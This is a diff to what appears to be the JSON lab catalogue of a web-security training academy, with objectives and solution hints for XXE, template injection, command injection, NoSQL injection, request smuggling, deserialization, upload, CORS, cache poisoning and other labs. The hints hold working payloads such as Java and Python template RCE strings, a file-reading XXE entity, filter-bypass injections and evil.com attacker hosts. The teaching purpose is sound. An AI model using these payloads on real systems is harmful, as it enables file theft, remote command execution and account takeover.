+      "hint": "Use <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</code> then reference <code>&amp;xxe;</code> in the productId."
+    },
+    "xxe-2": {
+      "title": "XXE — SVG upload",
+      "topic": "xxe",
+      "difficulty": 2,
+      "type": "server",
       "objective": "The server renders uploaded SVGs without sanitizing entities. Leak a file via an SVG entity.",
-      "hint": "Upload an SVG containing <code>&lt;!DOCTYPE svg [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot;&gt;]&gt;</code> and reference &amp;xxe; in a text element." },
-    "xxe-3": { "title": "XXE — blind (external DTD)", "topic": "xxe", "difficulty": 3, "type": "server",
+      "hint": "Upload an SVG containing <code>&lt;!DOCTYPE svg [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot;&gt;]&gt;</code> and reference &amp;xxe; in a text element."
+    },
+    "xxe-3": {
+      "title": "XXE — blind (external DTD)",
+      "topic": "xxe",
+      "difficulty": 3,
+      "type": "server",
       "objective": "Entities are parsed but nothing is reflected. Fetch an external DTD from your host and confirm via the log.",
-      "hint": "Send XML with a parameter entity pointing at http://yourhost/evil.dtd, then check /lab/xxe-3/log for the callback." },
-    "xxe-4": { "title": "XXE → SSRF", "topic": "xxe", "difficulty": 2, "type": "server",
+      "hint": "Send XML with a parameter entity pointing at http://yourhost/evil.dtd, then check /lab/xxe-3/log for the callback."
+    },
+    "xxe-4": {
+      "title": "XXE → SSRF",
+      "topic": "xxe",
+      "difficulty": 2,
+      "type": "server",
       "objective": "Point an external entity at an internal admin service.",
-      "hint": "Use <code>&lt;!ENTITY xxe SYSTEM &quot;http://localhost:8080/admin&quot;&gt;</code> and reference &amp;xxe; in the productId." },
-    "ssti-1": { "title": "SSTI — basic template injection", "topic": "ssti", "difficulty": 1, "type": "server",
+      "hint": "Use <code>&lt;!ENTITY xxe SYSTEM &quot;http://localhost:8080/admin&quot;&gt;</code> and reference &amp;xxe; in the productId."
+    },
+    "ssti-1": {
+      "title": "SSTI — basic template injection",
+      "topic": "ssti",
+      "difficulty": 1,
+      "type": "server",
       "objective": "The product name is rendered through a template engine. Execute arbitrary template syntax.",
-      "hint": "Submit a name containing <code>${7*7}</code> or <code>{{7*7}}</code>; if it evaluates to 49 the engine is injectable." },
-    "ssti-2": { "title": "SSTI — arithmetic and env", "topic": "ssti", "difficulty": 2, "type": "server",
+      "hint": "Submit a name containing <code>${7*7}</code> or <code>{{7*7}}</code>; if it evaluates to 49 the engine is injectable."
+    },
+    "ssti-2": {
+      "title": "SSTI — arithmetic and env",
+      "topic": "ssti",
+      "difficulty": 2,
+      "type": "server",
       "objective": "In a template context where you can evaluate expressions, leak an environment secret.",
-      "hint": "Combine expression evaluation (e.g. <code>${7*7}</code>) with a method call that reads process.env once you identify the engine." },
-    "ssti-3": { "title": "SSTI — RCE via Java", "topic": "ssti", "difficulty": 3, "type": "server",
+      "hint": "Combine expression evaluation (e.g. <code>${7*7}</code>) with a method call that reads process.env once you identify the engine."
+    },
+    "ssti-3": {
+      "title": "SSTI — RCE via Java",
+      "topic": "ssti",
+      "difficulty": 3,
+      "type": "server",
       "objective": "A Java template engine is injectable. Achieve command execution.",
-      "hint": "Use a Java template expression like <code>${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}</code> (blocked strings may need obfuscation)." },
-    "ssti-4": { "title": "SSTI — RCE via Python", "topic": "ssti", "difficulty": 3, "type": "server",
+      "hint": "Use a Java template expression like <code>${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}</code> (blocked strings may need obfuscation)."
+    },
+    "ssti-4": {
+      "title": "SSTI — RCE via Python",
+      "topic": "ssti",
+      "difficulty": 3,
+      "type": "server",
       "objective": "A Python template engine is injectable. Achieve command execution.",
-      "hint": "Use a Python expression like <code>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</code>." },
-    "cmdi-1": { "title": "Command injection — basic", "topic": "cmdi", "difficulty": 1, "type": "server",
+      "hint": "Use a Python expression like <code>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</code>."
+    },
+    "cmdi-1": {
+      "title": "Command injection — basic",
+      "topic": "cmdi",
+      "difficulty": 1,
+      "type": "server",
       "objective": "The storeId parameter flows into a shell command. Execute your own command.",
-      "hint": "Append <code>; whoami</code> (or <code>| whoami</code>) to the storeId value." },
-    "cmdi-2": { "title": "Command injection — blind (log)", "topic": "cmdi", "difficulty": 2, "type": "server",
+      "hint": "Append <code>; whoami</code> (or <code>| whoami</code>) to the storeId value."
+    },
+    "cmdi-2": {
+      "title": "Command injection — blind (log)",
+      "topic": "cmdi",
+      "difficulty": 2,
+      "type": "server",
       "objective": "Output is never returned. Inject a command and confirm execution via the log.",
-      "hint": "Append <code>; whoami</code> to storeId, then check /lab/cmdi-2/log for the executed command." },
-    "cmdi-3": { "title": "Command injection — filter bypass", "topic": "cmdi", "difficulty": 3, "type": "server",
+      "hint": "Append <code>; whoami</code> to storeId, then check /lab/cmdi-2/log for the executed command."
+    },
+    "cmdi-3": {
+      "title": "Command injection — filter bypass",
+      "topic": "cmdi",
+      "difficulty": 3,
+      "type": "server",
       "objective": "Whitespace and common metacharacters are filtered. Bypass and run a command.",
-      "hint": "Use <code>$IFS</code> for spaces and obfuscate command strings (e.g. <code>w&#104;oami</code>) to bypass character filters." },
-    "nosql-1": { "title": "NoSQL injection — login bypass", "topic": "nosql", "difficulty": 2, "type": "server",
+      "hint": "Use <code>$IFS</code> for spaces and obfuscate command strings (e.g. <code>w&#104;oami</code>) to bypass character filters."
+    },
+    "nosql-1": {
+      "title": "NoSQL injection — login bypass",
+      "topic": "nosql",
+      "difficulty": 2,
+      "type": "server",
       "objective": "The login query trusts an operator object. Log in as administrator without the password.",
-      "hint": "Submit a JSON body with <code>{&quot;username&quot;:&quot;administrator&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;&quot;}}</code>." },
-    "nosql-2": { "title": "NoSQL injection — $regex (query param)", "topic": "nosql", "difficulty": 2, "type": "server",
+      "hint": "Submit a JSON body with <code>{&quot;username&quot;:&quot;administrator&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;&quot;}}</code>."
+    },
+    "nosql-2": {
+      "title": "NoSQL injection — $regex (query param)",
+      "topic": "nosql",
+      "difficulty": 2,
+      "type": "server",
       "objective": "The username field is compared against a user-supplied regular expression. Match administrator.",
-      "hint": "Send <code>username[$regex]=^adm</code> (or just <code>adm</code>) so the regex matches the administrator account." },
-    "nosql-3": { "title": "NoSQL injection — $regex password reset", "topic": "nosql", "difficulty": 3, "type": "server",
+      "hint": "Send <code>username[$regex]=^adm</code> (or just <code>adm</code>) so the regex matches the administrator account."
+    },
+    "nosql-3": {
+      "title": "NoSQL injection — $regex password reset",
+      "topic": "nosql",
+      "difficulty": 3,
+      "type": "server",
       "objective": "Password reset dispatches to the account whose username matches your input. Hijack the administrator reset.",
-      "hint": "Send a reset request with <code>username[$regex]=^adm</code> so the query matches the administrator account." },
-    "smug-1": { "title": "Request smuggling — CL.TE basic", "topic": "smug", "difficulty": 3, "type": "server",
+      "hint": "Send a reset request with <code>username[$regex]=^adm</code> so the query matches the administrator account."
+    },
+    "smug-1": {
+      "title": "Request smuggling — CL.TE basic",
+      "topic": "smug",
+      "difficulty": 3,
+      "type": "server",
       "objective": "The front-end uses Content-Length, the back-end uses Transfer-Encoding. Smuggle a request.",
-      "hint": "Send a body with both headers where CL is short and TE contains a smuggled <code>GET /admin</code> plus <code>0</code> terminator." },
-    "smug-2": { "title": "Request smuggling — TE.CL", "topic": "smug", "difficulty": 4, "type": "server",
+      "hint": "Send a body with both headers where CL is short and TE contains a smuggled <code>GET /admin</code> plus <code>0</code> terminator."
+    },
+    "smug-2": {
+      "title": "Request smuggling — TE.CL",
+      "topic": "smug",
+      "difficulty": 4,
+      "type": "server",
       "objective": "The front-end uses Transfer-Encoding, the back-end uses Content-Length. Smuggle a request.",
-      "hint": "Send both headers where TE is short and CL spans the smuggled request; terminate with <code>0\r\n\r\n</code>." },
-    "smug-3": { "title": "Request smuggling — obfuscated TE", "topic": "smug", "difficulty": 4, "type": "server",
+      "hint": "Send both headers where TE is short and CL spans the smuggled request; terminate with <code>0\r\n\r\n</code>."
+    },
+    "smug-3": {
+      "title": "Request smuggling — obfuscated TE",
+      "topic": "smug",
+      "difficulty": 4,
+      "type": "server",
       "objective": "An obfuscated Transfer-Encoding header is accepted by one server and ignored by the other. Smuggle a request.",
-      "hint": "Try unusual TE values (e.g. <code>Transfer-Encoding: chunked</code> plus <code>X: x</code> header confusion) so the servers disagree." },
-    "deser-1": { "title": "Insecure deserialization — object tampering", "topic": "deser", "difficulty": 2, "type": "client",
+      "hint": "Try unusual TE values (e.g. <code>Transfer-Encoding: chunked</code> plus <code>X: x</code> header confusion) so the servers disagree."
+    },
+    "deser-1": {
+      "title": "Insecure deserialization — object tampering",
+      "topic": "deser",
+      "difficulty": 2,
+      "type": "client",
       "objective": "Your session cookie is a base64 PHP serialized object. Set isAdmin to true.",
-      "hint": "Decode the <code>session</code> cookie, change <code>s:7:\"isAdmin\";b:0;</code> to <code>b:1;</code>, re-encode base64, and reload." },
-    "deser-2": { "title": "Insecure deserialization — gadget chain", "topic": "deser", "difficulty": 4, "type": "client",
+      "hint": "Decode the <code>session</code> cookie, change <code>s:7:\"isAdmin\";b:0;</code> to <code>b:1;</code>, re-encode base64, and reload."
+    },
+    "deser-2": {
+      "title": "Insecure deserialization — gadget chain",
+      "topic": "deser",
+      "difficulty": 4,
+      "type": "client",
       "objective": "A serialized object with a magic method runs on destruction. Craft one that reads /flag.",
-      "hint": "Encode a PHP object with a __destruct that executes a command (e.g. a class whose destructor runs <code>cat /flag</code>) into the <code>pref</code> cookie." },
-    "upload-1": { "title": "File upload — no restrictions", "topic": "upload", "difficulty": 1, "type": "server",
+      "hint": "Encode a PHP object with a __destruct that executes a command (e.g. a class whose destructor runs <code>cat /flag</code>) into the <code>pref</code> cookie."
+    },
+    "upload-1": {
+      "title": "File upload — no restrictions",
+      "topic": "upload",
+      "difficulty": 1,
+      "type": "server",
       "objective": "Upload a web shell with no filtering.",
-      "hint": "Upload any file named <code>shell.php</code>." },
-    "upload-2": { "title": "File upload — content-type check", "topic": "upload", "difficulty": 2, "type": "server",
+      "hint": "Upload any file named <code>shell.php</code>."
+    },
+    "upload-2": {
+      "title": "File upload — content-type check",
+      "topic": "upload",
+      "difficulty": 2,
+      "type": "server",
       "objective": "Only the client-supplied Content-Type is checked. Upload a .php as an image.",
-      "hint": "Upload <code>shell.php</code> with <code>Content-Type: image/png</code> on the request." },
-    "upload-3": { "title": "File upload — extension blacklist", "topic": "upload", "difficulty": 2, "type": "server",
+      "hint": "Upload <code>shell.php</code> with <code>Content-Type: image/png</code> on the request."
+    },
+    "upload-3": {
+      "title": "File upload — extension blacklist",
+      "topic": "upload",
+      "difficulty": 2,
+      "type": "server",
       "objective": "The .php extension is blocked. Bypass with an alternate extension.",
-      "hint": "Try <code>.php5</code>, <code>.phtml</code>, <code>.phar</code>, or <code>.pHp</code>." },
-    "bl-1": { "title": "Business logic — price tampering", "topic": "bl", "difficulty": 2, "type": "server",
+      "hint": "Try <code>.php5</code>, <code>.phtml</code>, <code>.phar</code>, or <code>.pHp</code>."
+    },
+    "bl-1": {
+      "title": "Business logic — price tampering",
+      "topic": "bl",
+      "difficulty": 2,
+      "type": "server",
       "objective": "The price is submitted by the client. Tamper with it to get a refund.",
-      "hint": "POST the add-to-cart form with <code>price=-100</code>." },
-    "bl-2": { "title": "Business logic — negative quantity", "topic": "bl", "difficulty": 2, "type": "server",
+      "hint": "POST the add-to-cart form with <code>price=-100</code>."
+    },
+    "bl-2": {
+      "title": "Business logic — negative quantity",
+      "topic": "bl",
+      "difficulty": 2,
+      "type": "server",
       "objective": "Quantity is only validated client-side. Submit a negative quantity.",
-      "hint": "POST <code>quantity=-5</code> to the add-to-cart endpoint." },
-    "bl-3": { "title": "Business logic — coupon reuse", "topic": "bl", "difficulty": 3, "type": "server",
+      "hint": "POST <code>quantity=-5</code> to the add-to-cart endpoint."
+    },
+    "bl-3": {
+      "title": "Business logic — coupon reuse",
+      "topic": "bl",
+      "difficulty": 3,
+      "type": "server",
       "objective": "A one-time coupon's redemption counter is not persisted. Reuse it.",
-      "hint": "Apply coupon <code>NEWCUST15</code> once, then apply it a second time — it is accepted again." },
-    "race-1": { "title": "Race condition — coupon overrun", "topic": "race", "difficulty": 3, "type": "server",
+      "hint": "Apply coupon <code>NEWCUST15</code> once, then apply it a second time — it is accepted again."
+    },
+    "race-1": {
+      "title": "Race condition — coupon overrun",
+      "topic": "race",
+      "difficulty": 3,
+      "type": "server",
       "objective": "The coupon checks 'used?' then marks it used. Send two redemption requests in parallel.",
-      "hint": "Fire two concurrent POSTs with <code>coupon=RACE50</code> so both pass the check before either marks it used." },
-    "race-2": { "title": "Race condition — multi-endpoint", "topic": "race", "difficulty": 4, "type": "server",
+      "hint": "Fire two concurrent POSTs with <code>coupon=RACE50</code> so both pass the check before either marks it used."
+    },
+    "race-2": {
+      "title": "Race condition — multi-endpoint",
+      "topic": "race",
+      "difficulty": 4,
+      "type": "server",
       "objective": "Email change and password reset are individually validated but unsafe together. Fire both simultaneously.",
-      "hint": "Send <code>POST /lab/race-2/email</code> and <code>POST /lab/race-2/reset</code> in parallel so each sees the other's timestamp within the window." },
-    "crypto-1": { "title": "Weak crypto — predictable reset token", "topic": "crypto", "difficulty": 2, "type": "client",
+      "hint": "Send <code>POST /lab/race-2/email</code> and <code>POST /lab/race-2/reset</code> in parallel so each sees the other's timestamp within the window."
+    },
+    "crypto-1": {
+      "title": "Weak crypto — predictable reset token",
+      "topic": "crypto",
+      "difficulty": 2,
+      "type": "client",
       "objective": "Password reset tokens are md5(username). Forge one for carlos.",
-      "hint": "Get the token via <code>/lab/crypto-1?username=carlos</code>, then hit <code>/lab/crypto-1/reset?token=&lt;token&gt;&amp;username=carlos</code>." },
-    "crypto-2": { "title": "Weak crypto — forged JWT", "topic": "crypto", "difficulty": 3, "type": "client",
+      "hint": "Get the token via <code>/lab/crypto-1?username=carlos</code>, then hit <code>/lab/crypto-1/reset?token=&lt;token&gt;&amp;username=carlos</code>."
+    },
+    "crypto-2": {
+      "title": "Weak crypto — forged JWT",
+      "topic": "crypto",
+      "difficulty": 3,
+      "type": "client",
       "objective": "JWTs are signed with a weak secret (md5(secret + payload)). Forge an admin token.",
-      "hint": "Set payload <code>{&quot;role&quot;:&quot;admin&quot;}</code>, sign with <code>md5('supersecret' + base64url(payload))</code>, send as <code>Authorization: Bearer &lt;token&gt;</code>." }
+      "hint": "Set payload <code>{&quot;role&quot;:&quot;admin&quot;}</code>, sign with <code>md5('supersecret' + base64url(payload))</code>, send as <code>Authorization: Bearer &lt;token&gt;</code>."
+    },
+    "cors-1": {
+      "title": "CORS — reflects any Origin",
+      "topic": "cors",
+      "difficulty": 1,
+      "type": "client",
+      "objective": "The API reflects any Origin and allows credentials. Read account data cross-origin.",
+      "hint": "Send <code>Origin: https://evil.com</code> to <code>/lab/cors-1</code>. The server reflects it with <code>Access-Control-Allow-Credentials: true</code>."
+    },
+    "cors-2": {
+      "title": "CORS — trusts Origin: null",
+      "topic": "cors",
+      "difficulty": 1,
+      "type": "client",
+      "objective": "The server trusts the literal <code>Origin: null</code> (sandboxed iframe/file requests).",
+      "hint": "Trigger a request with <code>Origin: null</code> (e.g. via a sandboxed iframe) and the API responds with credentials allowed."
+    },
+    "cors-3": {
+      "title": "CORS — suffix allowlist bypass",
+      "topic": "cors",
+      "difficulty": 2,
+      "type": "client",
+      "objective": "The allowlist check is <code>origin.endsWith(\"trusted.com\")</code> — the missing leading dot lets attacker domains pass.",
+      "hint": "Use <code>Origin: https://eviltrusted.com</code> — it ends with <code>trusted.com</code>."
+    },
+    "cors-4": {
+      "title": "CORS — substring allowlist bypass",
+      "topic": "cors",
+      "difficulty": 2,
+      "type": "client",
+      "objective": "The allowlist check is <code>origin.includes(\"partner.com\")</code> — a substring match an attacker can abuse.",
+      "hint": "Use <code>Origin: https://evilpartner.com</code> — it contains <code>partner.com</code>."
+    },
+    "host-1": {
+      "title": "Host header — password reset poisoning",
+      "topic": "host",
+      "difficulty": 2,
+      "type": "client",
+      "objective": "The reset link is built from the Host header. Poison it to send a reset link to an attacker.",
+      "hint": "POST <code>/lab/host-1/reset?username=carlos</code> with <code>Host: evil.com</code>."
+    },
+    "host-2": {
+      "title": "Host header — X-Forwarded-Host poisoning",
+      "topic": "host",
+      "difficulty": 2,
+      "type": "client",
+      "objective": "The proxy trusts <code>X-Forwarded-Host</code> unvalidated when building the reset link.",
+      "hint": "POST <code>/lab/host-2/reset?username=carlos</code> with <code>X-Forwarded-Host: evil.com</code>."
+    },
+    "host-3": {
+      "title": "Host header — validation bypass via @",
+      "topic": "host",
+      "difficulty": 3,
+      "type": "client",
+      "objective": "The server validates the Host ends with the site hostname, but accepts an attacker prefix separated by <code>@</code>.",
+      "hint": "Use <code>Host: evil.com@&lt;site-host&gt;</code> — it ends with the site host yet resolves to evil.com."
+    },
+    "cache-1": {
+      "title": "Cache poisoning — unkeyed X-Forwarded-Host",
+      "topic": "cache",
+      "difficulty": 3,
+      "type": "client",
+      "objective": "The page embeds a tracker built from the unkeyed <code>X-Forwarded-Host</code> header.",
+      "hint": "Send <code>X-Forwarded-Host: evil.com</code> to <code>/lab/cache-1</code> — the script src becomes <code>evil.com/track.js</code>."
+    },
+    "cache-2": {
+      "title": "Cache poisoning — unkeyed X-Forwarded-Scheme",
+      "topic": "cache",
+      "difficulty": 3,
+      "type": "client",
+      "objective": "The page is served over the unkeyed <code>X-Forwarded-Scheme</code>, allowing a protocol downgrade.",
+      "hint": "Send <code>X-Forwarded-Scheme: http</code> to <code>/lab/cache-2</code>."
+    },
+    "cache-3": {
+      "title": "Cache poisoning — unkeyed utm_source",
+      "topic": "cache",
+      "difficulty": 2,
+      "type": "client",
+      "objective": "The tracking param <code>utm_source</code> is unkeyed and reflected unescaped into the page.",
+      "hint": "Visit <code>/lab/cache-3?utm_source=...</code> with a payload in <code>utm_source</code>."
+    },
+    "proto-1": {
+      "title": "Prototype pollution — top-level __proto__",
+      "topic": "proto",
+      "difficulty": 3,
+      "type": "client",
+      "objective": "User JSON is merged into a server-side object via an unsafe merge that trusts <code>__proto__</code>.",
+      "hint": "POST <code>{\"__proto__\":{\"isAdmin\":true}}</code> to <code>/lab/proto-1</code>."
+    },
+    "proto-2": {
+      "title": "Prototype pollution — nested via constructor.prototype",
+      "topic": "proto",
+      "difficulty": 4,
+      "type": "client",
+      "objective": "Top-level <code>__proto__</code> is filtered, but the nested <code>constructor.prototype</code> path is not.",
+      "hint": "POST <code>{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}</code> to <code>/lab/proto-2</code>."
+    },
+    "proto-3": {
+      "title": "Prototype pollution — RCE gadget",
+      "topic": "proto",
+      "difficulty": 4,
+      "type": "client",
+      "objective": "Polluting <code>__proto__</code> with child-process gadget keys (<code>shell</code>, <code>NODE_OPTIONS</code>) leads to command execution.",
+      "hint": "POST <code>{\"__proto__\":{\"shell\":\"/bin/sh\"}}</code> to <code>/lab/proto-3</code>."
+    },
+    "graphql-1": {
+      "title": "GraphQL — introspection enabled",
+      "topic": "graphql",
+      "difficulty": 1,
+      "type": "client",
+      "objective": "Introspection is enabled and leaks the full schema.",
+      "hint": "POST <code>{\"query\":\"{ __schema { types { name } } }\"}</code> to <code>/lab/graphql-1</code>."
+    },
+    "graphql-2": {
+      "title": "GraphQL — BOLA on user query",
+      "topic": "graphql",
+      "difficulty": 2,
+      "type": "client",
+      "objective": "The <code>user(id:)</code> query returns any record without authorization (Broken Object Level Authorization).",
+      "hint": "Query <code>user(id: 2)</code> requesting sensitive fields like <code>password</code>."
+    },
+    "graphql-3": {
+      "title": "GraphQL — aliasing/batching",
+      "topic": "graphql",
+      "difficulty": 2,
+      "type": "client",
+      "objective": "Batching is allowed — multiple queries in a single JSON array bypass rate limits.",
+      "hint": "POST a JSON array: <code>[{\"query\":\"{ping}\"},{\"query\":\"{ping}\"}]</code>."
+    },
+    "ws-1": {
+      "title": "WebSocket — CSWSH",
+      "topic": "ws",
+      "difficulty": 3,
+      "type": "client",
+      "objective": "The WebSocket handshake does not validate Origin, enabling Cross-Site WebSocket Hijacking.",
+      "hint": "GET <code>/lab/ws-1/connect</code> with <code>Origin: https://evil.com</code> and your <code>academy_session</code> cookie."
+    },
+    "ws-2": {
+      "title": "WebSocket — stored XSS in chat",
+      "topic": "ws",
+      "difficulty": 2,
+      "type": "client",
+      "objective": "Chat messages are re-rendered unescaped, producing stored XSS.",
+      "hint": "POST <code>{\"message\":\"&lt;img src=x onerror=alert(1)&gt;\"}</code> to <code>/lab/ws-2/send</code>."
+    },
+    "redirect-1": {
+      "title": "Open redirect — no validation",
+      "topic": "redirect",
+      "difficulty": 1,
+      "type": "client",
+      "objective": "The redirect parameter is followed with no validation.",
+      "hint": "Visit <code>/lab/redirect-1?url=https://evil.com</code>."
+    },
+    "redirect-2": {
+      "title": "Open redirect — validation bypass",
+      "topic": "redirect",
+      "difficulty": 2,
+      "type": "client",
+      "objective": "Validation only checks the target <em>contains</em> <code>academy.example</code>.",
+      "hint": "Use a userinfo trick: <code>?url=https://academy.example@evil.com</code>."
+    },
+    "info-1": {
+      "title": "Info disclosure — verbose debug errors",
+      "topic": "info",
+      "difficulty": 1,
+      "type": "client",
+      "objective": "A debug route leaks stack traces and secrets.",
+      "hint": "Visit <code>/lab/info-1/debug</code> (or add <code>?debug=1</code>)."
+    },
+    "info-2": {
+      "title": "Info disclosure — leftover files",
+      "topic": "info",
+      "difficulty": 2,
+      "type": "client",
+      "objective": "Source maps, .git, or backup files are publicly accessible.",
+      "hint": "Try <code>/lab/info-2/app.js.map</code>, <code>/.git/config</code>, <code>backup.sql</code>, or <code>?source=1</code>."
+    }
   }
 }
